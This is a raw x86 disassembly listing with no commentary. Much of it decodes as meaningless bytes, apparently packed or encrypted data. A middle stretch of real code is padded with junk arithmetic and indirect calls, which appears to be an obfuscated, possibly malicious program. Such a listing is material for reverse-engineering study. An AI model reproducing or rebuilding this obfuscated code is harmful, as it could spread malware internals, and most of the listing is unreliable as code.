  41719a:	mov    edx,0x487c816a
  41719f:	out    dx,eax
  4171a0:	add    DWORD PTR [ebx-0x26],0xffffff85
  4171a4:	push   0x18
  4171a6:	dec    esi
  4171a7:	add    ecx,DWORD PTR [esi+eiz*2+0x49]
  4171ab:	inc    edx
  4171ac:	jno    0x417133
  4171ae:	fstp   TBYTE PTR [ecx-0x2b]
  4171b1:	inc    ecx
  4171b2:	sub    BYTE PTR [ebx-0x31],ah
  4171b5:	sbb    al,0x6f
  4171b7:	in     al,dx
  4171b8:	rol    al,0xa1
  4171bb:	xor    ecx,DWORD PTR [edi]
  4171bd:	dec    ecx
  4171be:	cmp    esi,DWORD PTR [ebx-0x5f94138f]
  4171c4:	push   ecx
  4171c5:	(bad)  
  4171c6:	inc    dx
  4171c8:	adc    BYTE PTR [eax],al
  4171ca:	pop    es
  4171cb:	xor    BYTE PTR [ebp+0x59],bh
  4171ce:	in     al,dx
  4171cf:	gs push ebx
  4171d1:	mov    cl,0x7
  4171d3:	jae    0x41721a
  4171d5:	mov    esi,0xd76ea56
  4171da:	adc    al,0x6e
  4171dc:	adc    ebp,DWORD PTR ds:0x7a090829
  4171e2:	xchg   ecx,eax
  4171e3:	mov    dh,0xdd
  4171e5:	fisttp WORD PTR [eax]
  4171e7:	mov    edx,0x1f36e7a1
  4171ec:	movzx  edi,BYTE PTR [eax-0x6db20bfb]
  4171f3:	nop
  4171f4:	mov    ds:0xe1ca6dfb,al
  4171f9:	daa    
  4171fa:	mov    bh,0xa1
  4171fc:	jle    0x4171e7
  4171fe:	or     BYTE PTR [esi],cl
  417200:	lahf   
  417201:	mov    esi,0xb2d0d9c9
  417206:	loopne 0x417271
  417208:	pop    esp
  417209:	xor    BYTE PTR [ecx],0x6a
  41720c:	not    edi
  41720e:	pop    es
  41720f:	scas   eax,DWORD PTR es:[edi]
  417210:	or     ecx,DWORD PTR [ebx]
  417212:	or     eax,0xa5d1870d
  417217:	sbb    edx,ebx
  417219:	aam    0x5a
  41721b:	jmp    0xaf80:0xbbff98c3
  417222:	adc    ebx,ecx
  417224:	aaa    
  417225:	aaa    
  417226:	sbb    BYTE PTR [eax-0x27],cl
  417229:	daa    
  41722a:	mov    ebp,0x646fc2e5
  41722f:	hlt    
  417230:	ret    0x8bd
  417233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417234:	cli    
  417235:	jo     0x417225
  417237:	xchg   edx,eax
  417238:	mul    ah
  41723a:	adc    esp,DWORD PTR [edx-0x52]
  41723d:	jp     0x4171ec
  41723f:	fsubp  st(0),st
  417241:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417242:	add    ah,BYTE PTR [eax+0x4e]
  417245:	fimul  WORD PTR [ecx]
  417247:	fisub  DWORD PTR [ebp-0x7d3fe2dc]
  41724d:	xchg   ebp,eax
  41724e:	cmp    eax,esi
  417250:	jmp    0xcbbbd07c
  417255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417256:	dec    eax
  417257:	push   ds
  417258:	scas   eax,DWORD PTR es:[edi]
  417259:	mov    edi,0x5b3fb4cb
  41725e:	fld    st(4)
  417260:	xchg   edi,eax
  417261:	inc    BYTE PTR [eax]
  417263:	sbb    al,0x7a
  417265:	push   eax
  417266:	push   0xc40b34c2
  41726b:	std    
  41726c:	pop    esi
  41726d:	sti    
  41726e:	outs   dx,BYTE PTR ds:[esi]
  41726f:	pusha  
  417270:	and    eax,0xfd804890
  417275:	cmp    DWORD PTR [eax+ebx*8],ecx
  417278:	fstp   QWORD PTR [ebx+ebx*8+0x1e]
  41727c:	retf   
  41727d:	cmp    esp,DWORD PTR es:0x583e60f6
  417284:	push   ds
  417285:	cmp    al,0x3f
  417287:	fdiv   st(3),st
  417289:	pop    edx
  41728a:	call   0x1d48:0x228e68b0
  417291:	pop    ss
  417292:	pop    es
  417293:	pop    edx
  417294:	sbb    al,0x6
  417296:	das    
  417297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417299:	mov    BYTE PTR ds:0x5ce9aa36,bh
  41729f:	in     eax,dx
  4172a0:	or     edi,edi
  4172a2:	ret    0x5c49
  4172a5:	pop    esi
  4172a6:	gs ja  0x4172e5
  4172a9:	inc    esp
  4172aa:	mov    dl,0xd0
  4172ac:	jb     0x417265
  4172ae:	lods   al,BYTE PTR ds:[esi]
  4172af:	ret    0x9e64
  4172b2:	fmul   DWORD PTR [esi-0x4d]
  4172b5:	inc    esi
  4172b6:	xor    bl,BYTE PTR [ecx-0x6]
  4172b9:	clc    
  4172ba:	mov    ah,BYTE PTR [ebx]
  4172bc:	xor    al,0x78
  4172be:	cmc    
  4172bf:	mov    ch,0xc
  4172c1:	adc    DWORD PTR [ecx],ebp
  4172c3:	mov    edx,0xeedd585b
  4172c8:	repnz shl DWORD PTR [edi+0x510dcbe2],cl
  4172cf:	xchg   DWORD PTR [eax-0x42],eax
  4172d2:	sub    eax,ebx
  4172d4:	inc    ecx
  4172d5:	lea    esp,[edx]
  4172d7:	xchg   DWORD PTR ss:[esi+ebp*1],ebp
  4172db:	pop    ds
  4172dc:	add    BYTE PTR [esi],dh
  4172de:	ins    DWORD PTR es:[edi],dx
  4172df:	imul   ebp,DWORD PTR [ebp-0x26131950],0x137bf8ed
  4172e9:	xchg   ebx,eax
  4172ea:	mov    ds:0xbdcee292,al
  4172ef:	jmp    DWORD PTR [edi-0x49]
  4172f2:	sub    al,BYTE PTR [ebp-0x56d16b8a]
  4172f8:	dec    ecx
  4172f9:	int3   
  4172fa:	mov    ecx,0x1b3c7f92
  4172ff:	lods   eax,DWORD PTR ds:[esi]
  417300:	rol    BYTE PTR [ecx],1
  417302:	retf   
  417303:	outs   dx,BYTE PTR ds:[esi]
  417304:	xchg   ebx,eax
  417305:	and    eax,DWORD PTR [esi-0x45770f91]
  41730b:	and    BYTE PTR [eax-0x741c3366],bh
  417311:	jp     0x41737c
  417313:	cdq    
  417314:	push   0xffffff89
  417316:	adc    BYTE PTR [edx],ah
  417318:	je     0x41735d
  41731a:	and    al,BYTE PTR es:[ebx+0x344989d7]
  417321:	leave  
  417322:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  417324:	lods   al,BYTE PTR ds:[esi]
  417325:	pop    esp
  417326:	dec    edi
  417327:	mov    DWORD PTR [ebx+0x4bbd169e],eax
  41732d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41732e:	out    dx,al
  41732f:	mov    edx,0x95e1a9db
  417334:	ss pushf 
  417336:	pop    edi
  417337:	imul   esp,esp,0xffffffa0
  41733a:	dec    edx
  41733b:	push   ebp
  41733c:	sahf   
  41733d:	add    al,0x28
  41733f:	mov    al,ds:0x93197c64
  417344:	mov    ebx,0xa81de924
  417349:	push   es
  41734a:	int    0xce
  41734c:	push   esp
  41734d:	push   0x24448de9
  417352:	inc    esp
  417353:	mov    DWORD PTR [esp+0xc],eax
  417357:	cmp    DWORD PTR ds:0x42832d,0x0
  41735e:	mov    DWORD PTR ds:0x428471,edi
  417364:	mov    ecx,0x653d
  417369:	jmp    0x417446
  41736e:	mov    DWORD PTR ds:0x428415,0x6fab
  417378:	mov    DWORD PTR ds:0x428409,0x3325
  417382:	cmp    DWORD PTR ds:0x42832d,0x0
  417389:	jl     0x4173a7
  41738f:	push   DWORD PTR [ebp-0x20]
  417392:	push   DWORD PTR [ebp-0xc]
  417395:	call   DWORD PTR ds:0x42e0ec
  41739b:	xor    edi,0x628b
  4173a1:	or     edi,0x2ad9
  4173a7:	and    DWORD PTR ds:0x42855d,edx
  4173ad:	and    ecx,DWORD PTR ds:0x428579
  4173b3:	xor    edi,edi
  4173b5:	add    edi,DWORD PTR ds:0x4284ad
  4173bb:	mov    edx,DWORD PTR ds:0x4285a5
  4173c1:	sub    edi,edx
  4173c3:	or     edi,DWORD PTR [edi+edx*1]
  4173c6:	inc    edx
  4173c7:	cmp    DWORD PTR ds:0x428355,0x0
  4173ce:	mov    DWORD PTR ds:0x428479,0x322b
  4173d8:	mov    DWORD PTR ds:0x428375,0x622c
  4173e2:	mov    edx,DWORD PTR ds:0x428345
  4173e8:	mov    DWORD PTR ds:0x4284cd,0x673b
  4173f2:	jmp    0x417446
  4173f7:	mov    DWORD PTR ds:0x42834d,edx
  4173fd:	cmp    DWORD PTR ds:0x428355,0x0
  417404:	jl     0x41742c
  41740a:	push   DWORD PTR [ebp-0x24]
  41740d:	push   0x428243
  417412:	call   DWORD PTR ds:0x42e27c
  417418:	sbb    DWORD PTR ds:0x428351,0x4806
  417422:	add    DWORD PTR ds:0x4284e1,0x48d6
  41742c:	add    edi,0x263
  417432:	xor    DWORD PTR ds:0x428359,0x2f2b
  41743c:	add    DWORD PTR ds:0x428581,0x7768
  417446:	lea    eax,[esp+0x60]
  41744a:	xor    ecx,ecx
  41744c:	or     ecx,DWORD PTR ds:0x42833d
  417452:	xor    DWORD PTR ds:0x428359,ecx
  417458:	mov    DWORD PTR [esp+0x10],eax
  41745c:	sub    edi,DWORD PTR ds:0x4284fd
  417462:	mov    eax,ds:0x422708
  417467:	sbb    DWORD PTR ds:0x428479,edx
  41746d:	mov    eax,DWORD PTR [eax+0x1d8]
  417473:	cmp    DWORD PTR ds:0x42847d,0x0
  41747a:	mov    edi,0x142d
  41747f:	mov    DWORD PTR ds:0x42836d,edi
  417485:	jmp    0x4174dd
  41748a:	not    ecx
  41748c:	cmp    DWORD PTR ds:0x42847d,0x0
  417493:	jg     0x4174bb
  417499:	push   DWORD PTR [ebp-0x1c]
  41749c:	push   0x483b
  4174a1:	call   DWORD PTR ds:0x42e0f0
  4174a7:	and    DWORD PTR ds:0x4284ed,0x19ab
  4174b1:	xor    DWORD PTR ds:0x428341,0x742c
  4174bb:	add    edx,DWORD PTR ds:0x428559
  4174c1:	sub    DWORD PTR ds:0x428469,0x7d91
  4174cb:	mov    edx,DWORD PTR ds:0x42841d
  4174d1:	or     DWORD PTR ds:0x4284e5,edx
  4174d7:	adc    DWORD PTR ds:0x4284f1,ecx
  4174dd:	mov    eax,DWORD PTR [eax]
  4174df:	mov    edi,DWORD PTR ds:0x428515
  4174e5:	mov    ecx,DWORD PTR ds:0x428591
  4174eb:	sub    ecx,edi
  4174ed:	or     edi,DWORD PTR [edi+ecx*1]
  4174f0:	mov    ecx,eax
  4174f2:	xor    ecx,0xa5069baf
  4174f8:	xor    edx,edx
  4174fa:	or     edx,DWORD PTR ds:0x428449
  417500:	sub    edx,DWORD PTR ds:0x42846d
  417506:	mov    DWORD PTR ds:0x428449,edx
  41750c:	xor    eax,0xfffffffe
  41750f:	shl    eax,0x1e
  417512:	and    DWORD PTR ds:0x428339,edi
  417518:	shr    ecx,0x2
  41751b:	or     ecx,eax
  41751d:	mov    eax,DWORD PTR [esp+0x10]
  417521:	inc    edx
  417522:	mov    DWORD PTR [eax],ecx
  417524:	xor    edx,edi
  417526:	mov    edi,0xcb79b566
  41752b:	mov    DWORD PTR [esp+0x80],edi
  417532:	mov    DWORD PTR [esp+0x84],esi
  417539:	cmp    DWORD PTR ds:0x428415,0x0
  417540:	movzx  ecx,WORD PTR ds:0x428345
  417547:	movzx  ecx,BYTE PTR ds:0x428439
  41754e:	jmp    0x4175bc
  417553:	not    edx
  417555:	cmp    DWORD PTR ds:0x428415,0x0
  41755c:	jb     0x4175ae
  417562:	push   DWORD PTR [ebp-0x20]
  417565:	push   0x1e74
  41756a:	push   0x10b8
  41756f:	push   0x6d55
  417574:	push   DWORD PTR [ebp-0x18]
  417577:	push   DWORD PTR [ebp-0x1c]
  41757a:	call   DWORD PTR ds:0x42e0f4
  417580:	movzx  edx,BYTE PTR ds:0x428581
  417587:	add    edx,DWORD PTR ds:0x4284e9
  41758d:	mov    DWORD PTR ds:0x428581,edx
  417593:	xor    ecx,ecx
  417595:	xor    ecx,DWORD PTR ds:0x4283b9
  41759b:	xor    edx,edx
  41759d:	xor    edx,DWORD PTR ds:0x428531
  4175a3:	sub    ecx,edx
  4175a5:	sub    ecx,DWORD PTR [ecx+edx*1]
  4175a8:	add    DWORD PTR ds:0x42836d,edx
  4175ae:	xor    DWORD PTR ds:0x428569,ebx
  4175b4:	sbb    DWORD PTR ds:0x428405,edx
  4175ba:	adc    edx,ecx
  4175bc:	mov    eax,DWORD PTR [esp+0x80]
  4175c3:	or     edx,edx
  4175c5:	mov    ecx,DWORD PTR [esp+0x84]
  4175cc:	cmp    DWORD PTR ds:0x428479,0x0
  4175d3:	mov    edx,DWORD PTR ds:0x42847d
  4175d9:	mov    DWORD PTR ds:0x428349,0x64c4
  4175e3:	mov    edx,DWORD PTR ds:0x42840d
  4175e9:	jmp    0x417644
  4175ee:	mov    DWORD PTR ds:0x428431,0x1a08
  4175f8:	cmp    DWORD PTR ds:0x428479,0x0
  4175ff:	ja     0x417624
  417605:	push   DWORD PTR [ebp-0x1c]
  417608:	call   DWORD PTR ds:0x42e280
  41760e:	sbb    edx,DWORD PTR ds:0x428351
  417614:	adc    DWORD PTR ds:0x42841d,0x1011
  41761e:	sbb    DWORD PTR ds:0x4284d5,ebx
  417624:	xor    edx,edx
  417626:	or     edx,DWORD PTR ds:0x428405
  41762c:	xor    DWORD PTR ds:0x42854d,edx
  417632:	add    DWORD PTR ds:0x42840d,ebx
  417638:	add    edx,0x156e
  41763e:	sub    edx,0x437f
  417644:	shrd   eax,ecx,0x2
  417648:	cmp    DWORD PTR ds:0x428501,0x0
  41764f:	mov    edx,0x364f
  417654:	mov    DWORD PTR ds:0x4284f5,0x205c
  41765e:	mov    edx,0xb6f
  417663:	jmp    0x4176bb
  417668:	mov    edx,DWORD PTR ds:0x428545
  41766e:	mov    DWORD PTR ds:0x428371,edi
  417674:	cmp    DWORD PTR ds:0x428501,0x0
  41767b:	jae    0x4176a7
  417681:	push   DWORD PTR [ebp-0x18]
  417684:	call   DWORD PTR ds:0x42e0f8
  41768a:	sub    DWORD PTR ds:0x428449,0x4a16
  417694:	mov    edx,DWORD PTR ds:0x428581
  41769a:	or     DWORD PTR ds:0x428565,edx
  4176a0:	sub    DWORD PTR ds:0x42854d,ecx
  4176a6:	dec    edx
  4176a7:	dec    edx
  4176a8:	not    DWORD PTR ds:0x428331
  4176ae:	movzx  edx,WORD PTR ds:0x428545
  4176b5:	sub    DWORD PTR ds:0x4284fd,edx
  4176bb:	shr    ecx,0x2
  4176be:	mov    ecx,DWORD PTR [esp+0x80]
  4176c5:	mov    edx,DWORD PTR [esp+0x84]
  4176cc:	add    DWORD PTR ds:0x428335,0x428361
  4176d6:	xor    eax,0x32de6d5d
  4176db:	adc    DWORD PTR ds:0x428365,0x4c3b
  4176e5:	xor    edx,edx
  4176e7:	or     DWORD PTR ds:0x4284dd,0x428351
  4176f1:	or     edx,eax
  4176f3:	mov    eax,ds:0x428465
  4176f8:	adc    DWORD PTR ds:0x428571,eax
  4176fe:	mov    eax,ds:0x422708
  417703:	or     DWORD PTR ds:0x42840d,0x428441
  41770d:	push   edx
  41770e:	or     DWORD PTR ds:0x428425,0x3421
  417718:	push   DWORD PTR [eax+0x19c]
  41771e:	lea    eax,[esp+0x80]
  417725:	push   eax
  417726:	sbb    DWORD PTR ds:0x428351,0x428465
  417730:	shl    ecx,0x1e
  417733:	call   0x411c08
  417738:	or     DWORD PTR ds:0x42840d,0x889
  417742:	lea    eax,[ebp+0x10]
  417745:	add    DWORD PTR ds:0x428435,0x428371
  41774f:	push   eax
  417750:	or     DWORD PTR ds:0x428411,0x378
  41775a:	mov    DWORD PTR [esp+0x14],edi
  41775e:	mov    DWORD PTR [esp+0x18],esi
  417762:	add    DWORD PTR ds:0x42856d,0x1c44
  41776c:	lea    eax,[ebp+0xc]
  41776f:	sbb    DWORD PTR ds:0x428565,0x6a60
  417779:	push   eax
  41777a:	adc    DWORD PTR ds:0x428481,0x65f7
  417784:	mov    DWORD PTR [esp+0x18],edi
  417788:	lea    eax,[ebp+0x8]
  41778b:	mov    DWORD PTR [esp+0x1c],esi
  41778f:	sub    DWORD PTR ds:0x428479,0x37c8
  417799:	jmp    0x4179f6
  41779e:	cmp    edx,eax
  4177a0:	retf   
  4177a1:	mov    esp,0x44b9bc3c
  4177a6:	out    0x8d,eax
  4177a8:	push   es
  4177a9:	xchg   edx,eax
  4177aa:	lahf   
  4177ab:	outs   dx,BYTE PTR ds:[esi]
  4177ac:	inc    eax
  4177ad:	(bad)  
  4177af:	faddp  st(0),st
  4177b1:	mov    esi,0xbebec235
  4177b6:	lea    edi,[edx+0x4efa8ac0]
  4177bc:	std    
  4177bd:	ffree  st(4)
  4177bf:	cld    
  4177c0:	enter  0x734b,0x47
  4177c4:	xchg   edi,eax
  4177c5:	mov    bl,0x1
  4177c7:	adc    DWORD PTR [esi],ecx
  4177c9:	popa   
  4177ca:	clc    
  4177cb:	arpl   WORD PTR [eax-0x26eb5e44],ax
  4177d1:	nop
  4177d2:	xchg   edi,eax
  4177d3:	pop    es
  4177d4:	ins    BYTE PTR es:[edi],dx
  4177d5:	jg     0x41783e
  4177d7:	addr16 mov ds:0x817d,eax
  4177db:	fisttp QWORD PTR [eax-0x3a8f4ce7]
  4177e1:	imul   ebx,DWORD PTR [edi-0x1743be90],0xd59af7e
  4177eb:	ret    
  4177ec:	retf   
  4177ed:	xchg   esi,eax
  4177ee:	test   al,0x67
  4177f0:	es or  eax,0xd5212f65
  4177f6:	fnstcw WORD PTR [esi-0xe5120a0]
  4177fc:	test   BYTE PTR ss:[edi-0x70],cl
  417800:	cmp    al,0x3a
  417802:	mov    ds:0x1ca4db1c,al
  417807:	js     0x417872
  417809:	cli    
  41780a:	arpl   WORD PTR [esi],dx
  41780c:	cdq    
  41780d:	and    DWORD PTR ds:0x51492181,esi
  417813:	jbe    0x4177a3
  417815:	sar    BYTE PTR [esi+0x7f],1
  417818:	sub    edx,DWORD PTR [edx+ecx*8-0x44]
  41781c:	out    0xf6,eax
  41781e:	(bad)  
  41781f:	adc    eax,0xa18542c7
  417824:	add    DWORD PTR [ebp+0x66],ebx
  417827:	cmp    ah,cl
  417829:	(bad)  
  41782a:	xlat   BYTE PTR ds:[ebx]
  41782b:	xlat   BYTE PTR ds:[ebx]
  41782c:	mov    esi,0x126076bd
  417831:	aaa    
  417832:	xchg   ecx,eax
  417833:	sub    cl,BYTE PTR [edx+0x50]
  417836:	lds    esi,FWORD PTR [edi-0x6]
  417839:	jae    0x417847
  41783b:	xor    DWORD PTR [ebp-0x33236b98],ebx
  417841:	jmp    WORD PTR [ebp+0x3f]
  417845:	dec    ebx
  417846:	add    bl,BYTE PTR [esi+0x24]
  417849:	daa    
  41784a:	scas   al,BYTE PTR es:[edi]
  41784b:	mov    al,ds:0xc9b8dfcf
  417850:	ss jns 0x41786f
  417853:	add    BYTE PTR [ecx],bh
  417855:	sbb    ah,BYTE PTR [edi-0x6b]
  417858:	ret    0x74ae
  41785b:	cmp    al,0x6d
  41785d:	stos   BYTE PTR es:[edi],al
  41785e:	mov    ebx,0xa37e6af0
  417863:	pushf  
  417864:	pop    ecx
  417865:	call   DWORD PTR [edx]
  417867:	mov    esp,0x918b6000
  41786c:	mov    eax,0x10bbc55b
  417871:	call   0x63f1e83b
  417876:	push   edi
  417877:	sub    esp,DWORD PTR [edx+0x4b8c2ddc]
  41787d:	or     ah,BYTE PTR [ebx+edi*1+0x60]
  417881:	jecxz  0x417818
  417883:	inc    edx
  417884:	adc    cl,BYTE PTR [ebp+0x674a8aa6]
  41788a:	mov    dh,0xe
  41788c:	xor    eax,0x459ab7a2
  417891:	lds    ecx,FWORD PTR [edi-0x5a18aa02]
  417897:	jo     0x4178a3
  417899:	sub    BYTE PTR [ebx+0x40],ah
  41789c:	pop    ds
  41789d:	loopne 0x4178ed
  41789f:	sub    eax,0x30782006
  4178a4:	push   eax
  4178a5:	enter  0x65f6,0xe0
  4178a9:	clc    
  4178aa:	jbe    0x4178cb
  4178ac:	out    0xe6,al
  4178ae:	aas    
  4178af:	pop    edi
  4178b0:	inc    esi
  4178b1:	xor    al,0x85
  4178b3:	outs   dx,DWORD PTR ds:[esi]
  4178b4:	fimul  DWORD PTR [edi+0x7f]
  4178b7:	shr    ch,1
  4178b9:	xchg   edi,eax
  4178ba:	jo     0x4178e3
  4178bc:	retf   
  4178bd:	inc    edx
  4178be:	out    0x23,eax
  4178c0:	pop    ebx
  4178c1:	or     BYTE PTR [ebx+eiz*4+0x25f3d2c9],dl
  4178c8:	fistp  WORD PTR [edi]
  4178ca:	in     al,0x48
  4178cc:	std    
  4178cd:	sbb    al,0xd5
  4178cf:	adc    bl,BYTE PTR [esi+ebp*8]
  4178d2:	push   DWORD PTR [edi]
  4178d4:	outs   dx,DWORD PTR ds:[esi]
  4178d5:	aad    0xf8
  4178d7:	dec    ecx
  4178d8:	shl    bh,0x2d
  4178db:	pop    ecx
  4178dc:	jge    0x4178de
  4178de:	sub    eax,0x185fc03a
  4178e3:	test   al,0xd
  4178e5:	push   edx
  4178e6:	in     eax,0xa1
  4178e8:	lods   eax,DWORD PTR ds:[esi]
  4178e9:	fs ja  0x417954
  4178ec:	push   ebx
  4178ed:	mov    ds:0x5256d0da,eax
  4178f2:	ins    BYTE PTR es:[edi],dx
  4178f3:	cld    
  4178f4:	pop    esp
  4178f5:	inc    ecx
  4178f6:	sti    
  4178f7:	xor    eax,0x20306e54
  4178fc:	xchg   esp,eax
  4178fd:	sti    
  4178fe:	and    al,al
  417900:	data16 or BYTE PTR [esi+ebp*8+0x3cf8ee7c],bh
  417908:	and    BYTE PTR [ebx+0x3770b7e],bl
  41790e:	sti    
  41790f:	adc    ah,BYTE PTR [eax]
  417911:	shl    edi,cl
  417913:	xchg   edx,eax
  417914:	mov    esp,0x9437f040
  417919:	aas    
  41791a:	aas    
  41791b:	fcmovbe st,st(6)
  41791d:	push   es
  41791e:	push   esi
  41791f:	call   0xc8292a99
  417924:	dec    edi
  417925:	nop
  417926:	dec    ebx
  417927:	push   0x2f
  417929:	repnz add eax,0xbf24adcb
  41792f:	dec    ebx
  417930:	sbb    ebp,DWORD PTR [ecx-0x72655844]
  417936:	test   eax,0x9012f385
  41793b:	leave  
  41793c:	imul   ecx,DWORD PTR [edx+0x350b258a],0xffffffc2
  417943:	imul   ecx,DWORD PTR [eax-0x2f7da3ac],0xd3e276b1
  41794d:	jl     0x417980
  41794f:	dec    edx
  417950:	aam    0xa0
  417952:	jle    0x4179ce
  417954:	mov    ds:0x8a69bd9e,al
  417959:	sahf   
  41795a:	mov    fs,WORD PTR [ebx+eax*1]
  41795d:	xchg   edi,eax
  41795e:	and    al,0x23
  417960:	out    0x9b,al
  417962:	add    al,0xa
  417964:	dec    edi
  417965:	test   BYTE PTR [edi-0x48],dh
  417968:	loopne 0x41795a
  41796a:	daa    
  41796b:	dec    eax
  41796c:	sbb    DWORD PTR ds:0x9275894e,esp
  417972:	jl     0x417979
  417974:	and    al,0xfd
  417976:	sub    bh,ah
  417978:	es inc esp
  41797a:	sbb    cl,ch
  41797c:	leave  
  41797d:	dec    ebx
  41797e:	xchg   DWORD PTR [edx+0x1],esp
  417981:	mov    ah,0x69
  417983:	or     dl,BYTE PTR [edi+0x5d]
  417986:	or     ch,BYTE PTR [edx-0x5f883eb9]
  41798c:	inc    eax
  41798d:	push   0xfc420233
  417992:	push   0x50
  417994:	aam    0x3d
  417996:	jl     0x417942
  417998:	test   ah,bl
  41799a:	mov    ds:0x9de7de37,al
  41799f:	(bad)
  4179a3:	ret    
  4179a4:	inc    ecx
  4179a5:	cmp    al,0xe4
  4179a7:	xor    DWORD PTR [ebp-0x3f],0xffffffa0
  4179ab:	pop    eax
  4179ac:	mov    esi,0xe4c2f64b
  4179b1:	mov    bh,0x88
  4179b3:	sub    eax,0x4cbc9b04
  4179b8:	in     al,dx
  4179b9:	(bad)  
  4179ba:	dec    ebp
  4179bb:	pop    edx
  4179bc:	jg     0x417a1a
  4179be:	cmp    ebp,edx
  4179c0:	sub    eax,0xf1f73770
  4179c5:	sahf   
  4179c6:	inc    esi
  4179c7:	push   esp
  4179c8:	call   0xf370:0xab6dd693
  4179cf:	xchg   DWORD PTR [eax+0x19a1ddf8],ebx
  4179d5:	stc    
  4179d6:	or     al,0xf1
  4179d8:	outs   dx,BYTE PTR ds:[esi]
  4179d9:	inc    ebp
  4179da:	jge    0x4179a9
  4179dc:	mov    edx,0x114200f8
  4179e1:	test   eax,0xd992b02b
  4179e6:	enter  0x8264,0x16
  4179ea:	in     al,0xce
  4179ec:	lds    edi,FWORD PTR ds:0x519c2ec9
  4179f2:	fcom   QWORD PTR [edi-0x66]
  4179f5:	(bad)  
  4179f6:	mov    DWORD PTR [esp+0x18],edi
  4179fa:	adc    DWORD PTR ds:0x4284d9,0x42836d
  417a04:	jmp    0x417c61
  417a09:	and    BYTE PTR [ecx],al
  417a0b:	fst    QWORD PTR [ecx-0x4b4b4d1d]
  417a11:	jb     0x417a54
  417a13:	sahf   
  417a14:	nop
  417a15:	call   0x74112ca6
  417a1a:	loop   0x4179dc
  417a1c:	mov    esi,0xbebec235
  417a21:	scas   al,BYTE PTR es:[edi]
  417a22:	les    ebx,FWORD PTR [eax-0x163b123f]
  417a28:	sbb    bl,0x9e
  417a2b:	stos   DWORD PTR es:[edi],eax
  417a2c:	xchg   esi,eax
  417a2d:	cs mov ch,0x3a
  417a30:	and    ch,BYTE PTR [esi+0x1b]
  417a33:	fidiv  DWORD PTR [ebx-0x58]
  417a36:	sub    DWORD PTR [ebp+edi*1+0x2a],0x64
  417a3b:	dec    eax
  417a3c:	outs   dx,BYTE PTR ds:[esi]
  417a3d:	rol    eax,1
  417a3f:	int3   
  417a40:	inc    edi
  417a41:	sub    DWORD PTR [ebx],esp
  417a43:	pop    esp
  417a44:	mov    es,eax
  417a46:	ds cld 
  417a48:	arpl   si,dx
  417a4a:	cli    
  417a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a4c:	mov    al,0xc
  417a4e:	pop    es
  417a4f:	sub    DWORD PTR [ecx+ebx*4-0x779afc43],eax
  417a56:	mov    esp,0x1c632bf1
  417a5b:	push   0x7fbec52e
  417a60:	(bad)  
  417a61:	mov    al,0x41
  417a63:	into   
  417a64:	push   ebp
  417a65:	xor    BYTE PTR [esi-0x4befb48c],dl
  417a6b:	adc    eax,0xee355c29
  417a70:	inc    esi
  417a71:	fs inc eax
  417a73:	jb     0x417a1b
  417a75:	inc    edx
  417a76:	xchg   edx,eax
  417a77:	stc    
  417a78:	fdiv   QWORD PTR [edi-0x36]
  417a7b:	scas   eax,DWORD PTR es:[edi]
  417a7c:	jno    0x417aec
  417a7e:	sbb    ch,bh
  417a80:	pop    edx
  417a81:	add    cl,ah
  417a83:	nop
  417a84:	or     eax,0x5d15820b
  417a89:	jle    0x417a4a
  417a8b:	or     ebx,DWORD PTR [eax+0x69ee03bf]
  417a91:	loop   0x417a2a
  417a93:	(bad)  
  417a94:	jle    0x417a65
  417a96:	sar    DWORD PTR [ebp-0x74],cl
  417a99:	daa    
  417a9a:	mov    ds:0x5b3564,al
  417a9f:	rcr    BYTE PTR [edx-0x2c],cl
  417aa2:	xor    esi,esi
  417aa4:	es inc edi
  417aa6:	addr16 inc ecx
  417aa8:	xchg   ebp,eax
  417aa9:	adc    bh,0x82
  417aac:	stos   DWORD PTR es:[edi],eax
  417aad:	fdivr  DWORD PTR [esi]
  417aaf:	ret    
  417ab0:	xchg   edi,eax
  417ab1:	ins    DWORD PTR es:[edi],dx
  417ab2:	adc    ebp,DWORD PTR [edx-0x2e]
  417ab5:	cwde   
  417ab6:	popa   
  417ab7:	mov    al,ds:0x499aed67
  417abc:	pop    es
  417abd:	jge    0x417a4a
  417abf:	push   ds
  417ac0:	sub    DWORD PTR [ecx],ebx
  417ac2:	rol    BYTE PTR [edi+0x39],1
  417ac5:	test   eax,ecx
  417ac7:	scas   al,BYTE PTR es:[edi]
  417ac8:	daa    
  417ac9:	ret    0xae3a
  417acc:	jl     0x417b0a
  417ace:	pop    sp
  417ad0:	or     ch,BYTE PTR [edi+0x53]
  417ad3:	and    al,0xc4
  417ad5:	cmp    dh,dh
  417ad7:	retf   0xdbd1
  417ada:	inc    ecx
  417adb:	adc    ebx,DWORD PTR [edi+ebx*2]
  417ade:	stos   DWORD PTR es:[edi],eax
  417adf:	repnz inc ebp
  417ae1:	add    bh,BYTE PTR [ebx+0x22]
  417ae4:	or     dl,BYTE PTR [edx+0x7c]
  417ae7:	or     dh,BYTE PTR [eax+0x3459288]
  417aed:	lods   al,BYTE PTR ds:[esi]
  417aee:	dec    esi
  417aef:	push   esi
  417af0:	sar    BYTE PTR [eax],1
  417af2:	gs test eax,0xf1efde1e
  417af8:	dec    eax
  417af9:	loop   0x417b22
  417afb:	xchg   ecx,eax
  417afc:	popa   
  417afd:	pusha  
  417afe:	addr16 gs dec esp
  417b01:	push   ebp
  417b02:	and    DWORD PTR ds:0xc619c53f,eax
  417b08:	and    ebx,ebp
  417b0a:	icebp  
  417b0b:	daa    
  417b0c:	fst    DWORD PTR [ebx]
  417b0e:	mov    WORD PTR [edi+eax*2-0x9328028],ds
  417b15:	and    BYTE PTR [esi-0x3b67e2cd],ah
  417b1b:	ss clc 
  417b1d:	int    0xcb
  417b1f:	xchg   ebp,eax
  417b20:	mov    ch,0x11
  417b22:	ret    
  417b23:	fcmovne st,st(6)
  417b25:	popw   ds
  417b27:	lea    ebx,[eax+0x36db9b79]
  417b2d:	ret    
  417b2e:	aaa    
  417b2f:	jbe    0x417b78
  417b31:	push   edi
  417b32:	loopne 0x417b65
  417b34:	imul   edi,DWORD PTR [ebx],0x5e0a235e
  417b3a:	enter  0x3dc1,0xbe
  417b3e:	cmp    ebp,DWORD PTR [eax+0x1]
  417b41:	imul   edi,edx,0x60
